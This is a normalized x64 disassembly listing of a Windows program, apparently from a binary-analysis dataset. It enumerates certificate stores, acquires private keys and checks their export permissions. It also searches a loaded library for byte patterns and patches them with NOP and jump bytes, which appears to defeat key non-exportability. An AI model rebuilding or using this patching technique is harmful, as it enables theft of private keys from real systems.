call sub_14000ac10
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0xe0 ] 0x8
jb r-xdata
lea rdx [ rbp + 0xc8 ]
lea rcx [ rbp - 0x60 ]
call sub_140003da0
mov r8 rax
mov edx [ rsp + 0x44 ]
mov rcx [ rsp + 0x78 ]
call sub_1400019f0
movzx r12d al
mov rcx [ rsp + 0x78 ]
call j_sub_14003ad04#2
lea rcx [ rsp + 0x78 ]
call j_sub_14003ad04#2
test r12b r12b
jne r-xdata
mov rcx [ rbp + 0xc8 ]
call j_sub_14003ad04
lea rcx [ rbp + 0x38 ]
call sub_140003cd0
lea rax [ r--data ]
mov [ rbp + 0x38 ] rax
lea rcx [ rbp + 0x38 ]
call sub_140037d08
movzx r12d [ rsp + 0x40 ]
xor r8d r8d
mov dl 0x1
lea rcx [ rbp + 0xc8 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0xe0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xc8 ]
call j_sub_14003ad04
nop
sub_1400178e0
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x170 ]
sub rsp 0x270
mov [ rbp - 0x70 ] 0xfffffffffffffffe
mov [ rsp + 0x2c0 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x168 ] rax
mov [ rsp + 0x30 ] r8b
mov r13 rdx
mov r14 rcx
mov [ rbp + 0xa0 ] rcx
mov [ rbp + 0xa8 ] rdx
xor esi esi
mov ebx esi
mov [ rsp + 0x5c ] ebx
lea edi [ rsi + 0x27 ]
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx r14
call sub_14000ae70
mov rcx rax
movzx edx di
call sub_14000fe50
mov [ rbp + 0xf0 ] 0x7
mov [ rbp + 0xe8 ] rsi
mov [ rbp + 0xd8 ] si
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx r14
lea rcx [ rbp + 0xd8 ]
call sub_140001dd0
lea rdx [ rsp + 0x3c ]
lea rcx [ rbp + 0xd8 ]
call sub_140001060
lea rcx [ rw-data ]
test al al
je r-xdata
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
nop
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
mov rdx r13
call sub_14000ae70
mov rcx rax
call sub_140007970
cmp [ r13 + 0x18 ] 0x8
jb r-xdata
mov [ r14 + 0x18 ] 0x7
mov [ r14 + 0x10 ] rsi
mov [ r14 ] si
cmp [ r13 + 0x18 ] 0x8
jb r-xdata
mov rcx [ r14 ]
call j_sub_14003ad04
mov rax r13
mov rax [ r13 ]
jmp r-xdata
mov [ r13 + 0x18 ] 0x7
mov [ r13 + 0x10 ] rsi
mov [ r13 ] si
mov rcx [ rbp + 0x168 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x2c0 ]
add rsp 0x270
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rcx [ r13 ]
call j_sub_14003ad04
xor r8d r8d
mov dl 0x1
lea rcx [ rbp + 0xb0 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0xc8 ] 0x8
jb r-xdata
mov edi esi
mov [ rsp + 0x3c ] esi
xor edx edx
mov rcx rax
call [ CertEnumCertificatesInStore@IAT ]
mov r12 rax
test rax rax
je r-xdata
mov r9d [ rsp + 0x3c ]
or r9d 0xc000
mov [ rsp + 0x20 ] rax
xor r8d r8d
xor edx edx
lea ecx [ rdx + 0xa ]
call [ CertOpenStore@IAT ]
mov r15 rax
test rax rax
je r-xdata
cmp [ r14 + 0x18 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xb0 ]
call j_sub_14003ad04
jmp r-xdata
mov edx 0x1
mov rcx r15
call [ CertCloseStore@IAT ]
jmp r-xdata
nop
xor esi esi
mov [ rax + 0x18 ] 0x7
xor eax eax
mov [ rsi + 0x10 ] rax
mov [ rsi ] ax
jmp r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp + 0xb0 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0xc8 ] 0x8
jb r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rsi
call sub_14000ae70
mov rcx rax
call sub_140007970
mov rcx rsi
call sub_140018c60
lea rax [ r--data ]
mov [ rbp - 0x60 ] rax
lea rax [ r--data ]
mov [ rbp - 0x50 ] rax
lea rax [ r--data ]
mov [ rbp + 0x38 ] rax
or ebx 0x1
mov [ rsp + 0x5c ] ebx
lea rdx [ rbp - 0x48 ]
lea rcx [ rbp - 0x60 ]
call sub_140004740
nop
mov rax [ rbp - 0x60 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rbp + rcx - 0x60 ] rax
lea rcx [ rbp - 0x48 ]
call sub_140004aa0
nop
lea rax [ r--data ]
mov [ rbp - 0x48 ] rax
xor ebx ebx
mov [ rbp + 0x28 ] rbx
mov [ rbp + 0x30 ] ebx
mov rdx r14
lea rcx [ rbp - 0x50 ]
call sub_14000ae70
mov rcx rax
lea edx [ rbx + 0x5f ]
call sub_14000fe50
mov rcx rax
mov rdx r13
call sub_14000ae70
mov rcx rax
lea edx [ rbx + 0x5f ]
call sub_14000fe50
mov rcx rax
mov edx edi
call sub_140008400
mov rcx rax
lea edx [ rbx + 0x5f ]
call sub_14000fe50
mov rcx rax
mov rdx rsi
call sub_14000ae70
mov rcx rax
lea edx [ rbx + 0x2e ]
call sub_14000fe50
mov [ rbp + 0x118 ] 0x7
mov [ rbp + 0x110 ] rbx
mov [ rbp + 0x100 ] bx
mov [ rbp + 0x140 ] 0x7
mov [ rbp + 0x138 ] rbx
mov [ rbp + 0x128 ] bx
mov [ rsp + 0x38 ] ebx
lea r9 [ rsp + 0x38 ]
xor r8d r8d
lea edx [ rbx + 0x2 ]
mov rcx r12
call [ CertGetCertificateContextProperty@IAT ]
test eax eax
je r-xdata
mov rdx rsi
mov rcx r12
call sub_140001530
test al al
je r-xdata
xor ebx ebx
mov rcx [ rbp + 0xb0 ]
call j_sub_14003ad04
cmp [ rsp + 0x30 ] 0x0
je r-xdata
lea r8 [ rsp + 0x38 ]
lea rdx [ rbp + 0x100 ]
mov rcx r12
call sub_140001610
test al al
je r-xdata
mov rdx r12
mov rcx r15
call [ CertEnumCertificatesInStore@IAT ]
mov r12 rax
inc edi
mov [ rsp + 0x3c ] edi
test rax rax
mov ebx [ rsp + 0x5c ]
jne r-xdata
cmp [ rsi + 0x18 ] 0x8
jb r-xdata
cmp [ rbp + 0x140 ] 0x8
jb r-xdata
lea rdx [ rbp + 0xd8 ]
lea rcx [ rbp - 0x60 ]
call sub_140003da0
nop
mov r8d 0x3
lea rdx [ r--data ]
lea rcx [ rbp + 0xd8 ]
call sub_14000bb30
mov [ rbp + 0xc8 ] 0x7
mov [ rbp + 0xc0 ] rbx
mov [ rbp + 0xb0 ] bx
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0xd8 ]
lea rcx [ rbp + 0xb0 ]
call sub_140001dd0
lea rdx [ rbp + 0xb0 ]
mov rcx r12
call sub_140001910
movzx edi al
lea rbx [ r--data ]
test al al
lea rax [ r--data ]
cmovne rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
lea rdx [ rbp + 0xd8 ]
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ac10
mov rcx rax
call sub_140007970
test dil dil
jne r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
lea rdx [ rbp + 0x100 ]
call sub_14000ae70
mov rcx rax
call sub_140007970
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
lea rdx [ rbp + 0x128 ]
call sub_14000ae70
mov rcx rax
call sub_140007970
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x58 ] ebx
mov [ rsp + 0x40 ] ebx
lea rax [ rsp + 0x40 ]
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0x58 ]
mov [ rsp + 0x20 ] rax
lea r9 [ rsp + 0x50 ]
xor r8d r8d
mov edx 0x10000
mov rcx r12
call [ CryptAcquireCertificatePrivateKey@IAT ]
test eax eax
je r-xdata
mov ecx 0x28
call sub_14003ac60
mov rsi rax
test rax rax
je r-xdata
xor esi esi
mov [ rsi + 0x18 ] 0x7
mov [ rsi + 0x10 ] rbx
mov [ rsi ] bx
mov rcx rsi
call j_sub_14003ad04
mov rcx [ rsi ]
call j_sub_14003ad04
mov [ rbp + 0x140 ] 0x7
xor ebx ebx
mov [ rbp + 0x138 ] rbx
mov [ rbp + 0x128 ] bx
cmp [ rbp + 0x118 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x128 ]
call j_sub_14003ad04
cmp [ rbp + 0xf0 ] 0x8
jb r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp + 0xb0 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0xc8 ] 0x8
jb r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp + 0xb0 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0xc8 ] 0x8
jb r-xdata
mov [ rsp + 0x38 ] ebx
xor dil dil
mov edx [ rsp + 0x58 ]
cmp edx 0xffffffff
jne r-xdata
mov [ rbp + 0x118 ] 0x7
mov [ rbp + 0x110 ] rbx
mov [ rbp + 0x100 ] bx
lea rcx [ rbp + 0x38 ]
call sub_140003cd0
lea rax [ r--data ]
mov [ rbp + 0x38 ] rax
lea rcx [ rbp + 0x38 ]
call sub_140037d08
mov edi [ rsp + 0x3c ]
jmp r-xdata
mov rcx [ rbp + 0x100 ]
call j_sub_14003ad04
mov rcx [ rbp + 0xd8 ]
call j_sub_14003ad04
nop
mov rcx [ rbp + 0xb0 ]
call j_sub_14003ad04
nop
xor ebx ebx
mov rcx [ rbp + 0xb0 ]
mov [ rsp + 0x34 ] ebx
mov [ rsp + 0x48 ] rbx
lea r8 [ rsp + 0x48 ]
mov rcx [ rsp + 0x50 ]
call [ CryptGetUserKey@IAT ]
test eax eax
setne bl
test bl bl
je r-xdata
cmp [ rw-data ] dil
je r-xdata
test rsi rsi
je r-xdata
cmp [ rsp + 0x40 ] 0x0
je r-xdata
mov [ rsp + 0x34 ] 0x4
xor edi edi
mov [ rsp + 0x20 ] edi
lea r9 [ rsp + 0x34 ]
lea r8 [ rsp + 0x38 ]
lea edx [ rdi + 0x9 ]
mov rcx [ rsp + 0x48 ]
call [ CryptGetKeyParam@IAT ]
test eax eax
setne bl
mov [ rsp + 0x34 ] 0x4
mov [ rsp + 0x20 ] edi
lea r9 [ rsp + 0x34 ]
lea r8 [ rsp + 0x64 ]
lea edx [ rdi + 0x6 ]
mov rcx [ rsp + 0x48 ]
call [ CryptGetKeyParam@IAT ]
test eax eax
setne al
and bl al
mov edi [ rsp + 0x64 ]
shr edi 0x2
and dil 0x1
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
jmp r-xdata
mov [ rsp + 0x34 ] ebx
mov [ rsp + 0x28 ] ebx
lea rax [ rsp + 0x34 ]
mov [ rsp + 0x20 ] rax
lea r9d [ rbx + 0x4 ]
lea r8 [ rsp + 0x38 ]
lea rdx [ r--data ]
mov rcx [ rsp + 0x50 ]
call [ rw-data ]
test eax eax
jne r-xdata
test bl bl
je r-xdata
xor edx edx
mov rcx [ rsp + 0x50 ]
call [ CryptReleaseContext@IAT ]
cmp [ rsp + 0x30 ] 0x0
je r-xdata
xor bl bl
cmp [ rsp + 0x34 ] 0x4
jne r-xdata
xor ebx ebx
lea rbx [ r--data ]
test dil dil
lea rax [ r--data ]
cmovne rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ac10
mov rcx rax
call sub_140007970
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov edx [ rsp + 0x38 ]
call sub_140008400
mov rcx rax
call sub_140007970
lea rdx [ rbp + 0xd8 ]
lea rcx [ rbp - 0x60 ]
call sub_140003da0
nop
mov r8d 0x3
lea rdx [ r--data ]
lea rcx [ rbp + 0xd8 ]
call sub_14000bb30
lea rax [ rsp + 0x68 ]
mov [ rsp + 0x48 ] rax
mov [ rbp - 0x80 ] 0x7
mov [ rsp + 0x78 ] rbx
mov [ rsp + 0x68 ] bx
mov r8d 0x8
lea rdx [ r--data ]
lea rcx [ rsp + 0x68 ]
call sub_140001ea0
nop
mov [ rbp + 0xc8 ] 0x7
mov [ rbp + 0xc0 ] rbx
mov [ rbp + 0xb0 ] bx
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0xd8 ]
lea rcx [ rbp + 0xb0 ]
call sub_140001dd0
nop
lea r8 [ rsp + 0x68 ]
lea rdx [ rbp + 0xb0 ]
mov rcx r12
call sub_140001700
movzx edi al
lea rbx [ r--data ]
test al al
lea rax [ r--data ]
cmovne rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
lea rdx [ rbp + 0xd8 ]
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ac10
mov rcx rax
call sub_140007970
test dil dil
jne r-xdata
xor al al
cmp [ rsp + 0x60 ] 0x4
jne r-xdata
mov bl 0x1
jmp r-xdata
cmp [ rbp + 0xf0 ] 0x8
jb r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp + 0xb0 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0xc8 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x50 ]
call [ rw-data ]
jmp r-xdata
mov al 0x1
movzx edi [ rsp + 0x48 ]
and dil al
jmp r-xdata
xor eax eax
mov [ rsp + 0x60 ] eax
mov [ rsp + 0x48 ] eax
mov [ rsp + 0x28 ] eax
lea rax [ rsp + 0x60 ]
mov [ rsp + 0x20 ] rax
mov r9d 0x4
lea r8 [ rsp + 0x48 ]
lea rdx [ r--data ]
mov rcx [ rsp + 0x50 ]
call [ rw-data ]
test eax eax
jne r-xdata
mov rcx [ rbp + 0xd8 ]
jmp r-xdata
mov rcx [ rbp + 0xb0 ]
call j_sub_14003ad04
nop
and bl al
cmp [ rsp + 0x40 ] 0x0
je r-xdata
call j_sub_14003ad04
sub_140018360
mov rax rsp
push rbp
push r12
push r13
push r14
push r15
lea rbp [ rax - 0x188 ]
sub rsp 0x260
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x150 ] rax
mov [ rbp + 0x148 ] 0x10c46f7
mov [ rbp + 0x14c ] 0x40
mov [ rbp + 0x14e ] 0x0
mov [ rsp + 0x20 ] 0xeb
mov [ rbp + 0x140 ] 0x10c46f7
mov [ rbp + 0x144 ] 0x40
mov [ rbp + 0x146 ] 0x0
mov [ rsp + 0x28 ] 0xe990
mov [ rbp + 0x130 ] 0xc66ba0f
mov [ rbp + 0x134 ] 0xe
mov [ rsp + 0x21 ] 0xeb
mov [ rbp + 0x138 ] 0xc66ba0f
mov [ rbp + 0x13c ] 0xe
mov [ rsp + 0x24 ] 0xe990
xor edx edx
mov r8d 0x11c
lea rcx [ rbp + 0x10 ]
call sub_14003d760
mov [ rbp + 0x10 ] 0x11c
lea rcx [ rbp + 0x10 ]
call [ GetVersionExW@IAT ]
test eax eax
je r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x18 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp ] 0x8
jb r-xdata
cmp [ rbp + 0x14 ] 0x5
seta r14b
mov [ rbp - 0x28 ] 0x7
xor r15d r15d
mov [ rbp - 0x30 ] r15
mov [ rbp - 0x40 ] r15w
xor r8d r8d
lea edx [ r15 + 0xa ]
lea rcx [ rbp - 0x40 ]
call sub_1400025a0
lea r11 [ rbp - 0x40 ]
cmp [ rbp - 0x28 ] 0x8
cmovae r11 [ rbp - 0x40 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov eax [ r--data ]
mov [ r11 + 0x10 ] eax
mov [ rbp - 0x30 ] 0xa
lea rax [ rbp - 0x40 ]
cmp [ rbp - 0x28 ] 0x8
cmovae rax [ rbp - 0x40 ]
mov [ rax + 0x14 ] r15w
lea rcx [ rbp - 0x40 ]
cmp [ rbp - 0x28 ] 0x8
cmovae rcx [ rbp - 0x40 ]
call [ GetModuleHandleW@IAT ]
mov rbx rax
test rax rax
je r-xdata
mov al 0x1
mov rcx [ rbp + 0x150 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x260 ]
mov rbx [ r11 + 0x30 ]
mov rsi [ r11 + 0x38 ]
mov rdi [ r11 + 0x40 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov rcx [ rbp - 0x18 ]
lea rcx [ rbp - 0x40 ]
cmp [ rbp - 0x28 ] 0x8
cmovae rcx [ rbp - 0x40 ]
call [ LoadLibraryW@IAT ]
mov rbx rax
cmp rax 0xffffffffffffffff
jne r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x18 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
lea rdx [ rbp - 0x40 ]
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp ] 0x8
jb r-xdata
cmp rbx 0xffffffffffffffff
je r-xdata
test rbx rbx
je r-xdata
cmp [ rbp - 0x28 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x18 ]
mov [ rbp - 0x78 ] 0x7
mov [ rbp - 0x80 ] r15
mov [ rsp + 0x70 ] r15w
mov [ rbp - 0x50 ] 0x7
mov [ rbp - 0x58 ] r15
mov [ rbp - 0x68 ] r15w
xor r8d r8d
lea rdx [ rbp - 0x40 ]
lea rcx [ rsp + 0x40 ]
call sub_14000c3b0
test al al
je r-xdata
mov rcx [ rbp - 0x40 ]
jmp r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x18 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
mov rsi [ rsp + 0x58 ]
mov r12d [ rsp + 0x60 ]
lea rdx [ r--data ]
mov rcx rbx
call [ GetProcAddress@IAT ]
mov rdi rax
test rax rax
je r-xdata
call j_sub_14003ad04
cmp [ rbp - 0x50 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x18 ]
call j_sub_14003ad04
nop
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_140004ed0
mov rcx rax
lea rdx [ rbp - 0x40 ]
call sub_14000ae70
mov rcx rax
call sub_140007970
jmp r-xdata
test rsi rsi
je r-xdata
mov [ rbp - 0x50 ] 0x7
mov [ rbp - 0x58 ] r15
mov [ rbp - 0x68 ] r15w
cmp [ rbp - 0x78 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x68 ]
call j_sub_14003ad04
test r12d r12d
je r-xdata
mov rcx [ rsp + 0x70 ]
jmp r-xdata
add r12 rsi
mov ecx 0x7
call j_sub_14003ac60
mov rsi rax
mov r8b 0x1
xor bl bl
call j_sub_14003ad04
nop
test r8b r8b
je r-xdata
lea rcx [ rdi + 0x7 ]
mov edx r15d
cmp rcx r12
setbe dl
test edx edx
je r-xdata
mov rcx rsi
call j_sub_14003ad04#2
test bl bl
je r-xdata
test bl bl
jne r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x18 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
jmp r-xdata
lea rbx [ rdi + 0x1 ]
mov ecx 0x5
call j_sub_14003ac60
mov r13 rax
mov r8b 0x1
xor sil sil
nop
mov r9d 0x7
mov r8 rdi
mov edx r9d
mov rcx rsi
call sub_14003b740
test eax eax
sete r8b
test r8b r8b
je r-xdata
cmp [ rbp ] 0x8
jb r-xdata
test r8b r8b
je r-xdata
lea rcx [ rbx + 0x5 ]
mov edx r15d
cmp rcx r12
setbe dl
test edx edx
je r-xdata
test r12 r12
je r-xdata
lea rax [ rbp + 0x140 ]
lea rcx [ rbp + 0x148 ]
test r14b r14b
cmove rax rcx
mov edx [ rsi ]
cmp edx [ rax ]
jne r-xdata
mov rcx r13
call j_sub_14003ad04#2
test sil sil
je r-xdata
test sil sil
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
movzx edx [ rsi + 0x4 ]
cmp dx [ rax + 0x4 ]
jne r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x18 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
jmp r-xdata
mov rsi r15
test r14b r14b
setne sil
lea rdx [ rsp + 0x28 ]
lea rax [ rsp + 0x20 ]
test r14b r14b
cmove rdx rax
lea rcx [ rdi + 0x7 ]
or r9 0xffffffffffffffff
lea r8 [ rsi + 0x1 ]
call sub_140006890
test al al
je r-xdata
mov r9d 0x5
mov r8 rbx
mov edx r9d
mov rcx r13
call sub_14003b740
test eax eax
sete r8b
test r8b r8b
je r-xdata
inc rdi
jmp r-xdata
movzx edx [ rsi + 0x6 ]
cmp dl [ rax + 0x6 ]
jne r-xdata
lea rdi [ r--data ]
lea rdx [ rsp + 0x24 ]
lea rax [ rsp + 0x21 ]
test r14b r14b
cmove rdx rax
lea rcx [ rbx + 0x5 ]
or r9 0xffffffffffffffff
lea r8 [ rsi + 0x1 ]
call sub_140006890
test al al
lea rdi [ r--data ]
jne r-xdata
test r12 r12
je r-xdata
lea rax [ rbp + 0x138 ]
lea rcx [ rbp + 0x130 ]
test r14b r14b
cmove rax rcx
mov edx [ r13 ]
cmp edx [ rax ]
jne r-xdata
mov eax r15d
jmp r-xdata
mov ebx r15d
test r14b r14b
setne bl
add bx 0x35
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
movzx edx bx
call sub_14000fe50
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
mov rdx rdi
call sub_14000ac10
mov rcx rax
call sub_140007970
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
movzx edx [ r13 + 0x4 ]
cmp dl [ rax + 0x4 ]
jne r-xdata
test eax eax
sete bl
test bl bl
jne r-xdata
inc rbx
jmp r-xdata
mov eax r15d
jmp r-xdata
test eax eax
sete sil
test sil sil
jne r-xdata
sub_140018980
push rbp
lea rbp [ rsp - 0x57 ]
sub rsp 0xe0
mov [ rbp - 0x19 ] 0xfffffffffffffffe
mov [ rsp + 0xf0 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x4f ] rax
mov rbx rcx
mov [ rbp + 0x17 ] 0xa75c085
mov [ rbp + 0x1b ] 0x90029bf
mov [ rbp + 0x1f ] 0xe980
mov [ rbp + 0x3f ] 0x90909090
mov [ rbp + 0x43 ] 0x90909090
mov [ rbp + 0x47 ] 0x90909090
mov [ rbp + 0x4b ] 0x9090
mov [ rbp + 0x37 ] 0xb8909090
mov [ rbp + 0x3b ] 0x80090029
mov [ rbp + 0x2f ] 0x33c03345
mov [ rbp + 0x33 ] 0xffc9
mov [ rbp + 0x35 ] 0x15
mov [ rbp + 0x27 ] 0x90909090
mov [ rbp + 0x2b ] 0x9090
cmp [ rw-data ] 0x0
je r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
xor r8d r8d
xor edx edx
lea rcx [ rbp - 0x49 ]
call [ rw-data ]
test eax eax
jne r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x11 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0x7 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x49 ]
call [ rw-data ]
test eax eax
sete al
test al al
je r-xdata
mov al 0x1
mov rcx [ rbp + 0x4f ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0xf0 ]
add rsp 0xe0
pop rbp
retn
mov rcx [ rbp - 0x11 ]
call j_sub_14003ad04
jmp r-xdata
mov rax [ rbx + 0x8 ]
mov [ rbp - 0x29 ] 0x7
mov r8d 0xa
lea rcx [ rbp - 0x41 ]
cmp [ rbx ] rax
lea rax [ rbp - 0x41 ]
mov [ rbp - 0x49 ] rax
jne r-xdata
xor ebx ebx
mov [ rbp - 0x31 ] rbx
mov [ rbp - 0x41 ] bx
lea rdx [ r--data ]
call sub_140001ea0
nop
mov [ rbp + 0x7 ] 0x7
mov [ rbp - 0x1 ] rbx
mov [ rbp - 0x11 ] bx
lea r8d [ rbx + 0x6 ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x11 ]
call sub_140001ea0
nop
mov [ rsp + 0x30 ] 0xe
mov [ rsp + 0x28 ] 0x8
lea rax [ rbp + 0x37 ]
mov [ rsp + 0x20 ] rax
lea r9d [ rbx + 0xa ]
lea r8 [ rbp + 0x17 ]
lea rdx [ rbp - 0x41 ]
lea rcx [ rbp - 0x11 ]
call sub_1400079e0
jmp r-xdata
xor ebx ebx
mov [ rbp - 0x31 ] rbx
mov [ rbp - 0x41 ] bx
lea rdx [ r--data ]
call sub_140001ea0
nop
mov [ rbp + 0x7 ] 0x7
mov [ rbp - 0x1 ] rbx
mov [ rbp - 0x11 ] bx
lea r8d [ rbx + 0x6 ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x11 ]
call sub_140001ea0
nop
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x28 ] 0xe
lea rax [ rbp + 0x3f ]
mov [ rsp + 0x20 ] rax
lea r9d [ rbx + 0xa ]
lea r8 [ rbp + 0x17 ]
lea rdx [ rbp - 0x41 ]
lea rcx [ rbp - 0x11 ]
call sub_1400079e0
test al al
je r-xdata
lea rax [ rbp - 0x41 ]
mov [ rbp - 0x49 ] rax
mov [ rbp - 0x29 ] 0x7
mov [ rbp - 0x31 ] rbx
mov [ rbp - 0x41 ] bx
lea r8d [ rbx + 0xc ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x41 ]
call sub_140001ea0
nop
mov [ rbp + 0x7 ] 0x7
mov [ rbp - 0x1 ] rbx
mov [ rbp - 0x11 ] bx
lea r8d [ rbx + 0x6 ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x11 ]
call sub_140001ea0
nop
mov [ rsp + 0x30 ] 0x5
mov [ rsp + 0x28 ] 0x6
lea rax [ rbp + 0x27 ]
mov [ rsp + 0x20 ] rax
lea r9d [ rbx + 0x7 ]
lea r8 [ rbp + 0x2f ]
lea rdx [ rbp - 0x41 ]
lea rcx [ rbp - 0x11 ]
call sub_1400079e0
jmp r-xdata
sub_140018c60
sub rsp 0x28
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x18 ] rax
cmp [ rcx + 0x18 ] 0x8
mov eax 0x5c
mov r9 rcx
mov [ rsp ] ax
mov eax 0x2f
mov [ rsp + 0x2 ] ax
mov eax 0x3a
mov [ rsp + 0x4 ] ax
mov eax 0x2a
mov [ rsp + 0x6 ] ax
mov eax 0x3f
mov [ rsp + 0x8 ] ax
mov eax 0x22
mov [ rsp + 0xa ] ax
mov eax 0x3c
mov [ rsp + 0xc ] ax
mov eax 0x3e
mov [ rsp + 0xe ] ax
mov eax 0x7c
mov [ rsp + 0x10 ] ax
jb r-xdata
mov rax rcx
mov rax [ rcx ]
jmp r-xdata
mov rdx r9
mov rdx [ r9 ]
jmp r-xdata
mov r10d 0x7e
mov rcx [ rsp + 0x18 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x28
retn
movzx r8d [ rax ]
xor edx edx
